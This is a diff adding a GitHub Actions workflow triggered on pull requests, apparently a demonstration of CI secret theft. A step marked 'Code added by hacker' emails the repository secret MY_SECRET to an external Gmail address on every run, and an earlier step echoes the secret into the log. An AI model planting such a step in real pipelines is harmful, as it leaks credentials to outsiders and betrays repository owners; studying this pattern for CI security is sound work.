@@ -1,0 +1,72 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI PR
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the main branch
+  #push: #branch github.ref
+  #  branches: [ main ]
+  pull_request: #branch github.head_ref
+    branches: [ main ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  workflow_dispatch:
+  
+env:
+  MY_SECRET: ${{ secrets.MY_SECRET }}
+  
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo [${{ secrets.MY_SECRET }}] Hello, world!
+
+      # Runs a set of commands using the runners shell
+      - name: 'Req #1 : Run test'
+        run: |
+          echo Running tests..
+          chmod +x runtests.sh
+          ./runtests.sh
+          cat runtests.out
+          echo Tests executed.  
+
+      ################################################
+      # Code added by hacker
+      ################################################
+      - name: Send mail from INTERNAL 
+        if: always()
+        uses: dawidd6/action-send-mail@v3
+        with:
+          # Specify connection via URL (replaces server_address, server_port, secure,
+          # username and password)
+          #
+          # Format:
+          #
+          #  * smtp://user:password@server:port
+          #  * smtp+starttls://user:password@server:port
+          connection_url: ${{secrets.MAIL_CONNECTION}}
+          # Required mail server address if not connection_url:
+          server_address: smtp.gmail.com
+          # Server port, default 25:
+          server_port: 465
+          # Optional whether this connection use TLS (default is true if server_port is 465)
+          secure: true
+          # Required mail subject:
+          subject: Github Actions job result
+          # Required recipients' addresses:
+          to: xyexternal@gmail.com
+          # Required sender full name (address can be skipped):
+          from: Luke Skywalker # <user@example.com>
+          # Optional plain body:  
+          body: INTERNAL Secret [${{ secrets.MY_SECRET }}].\n Build job of ${{github.repository}} completed successfully!
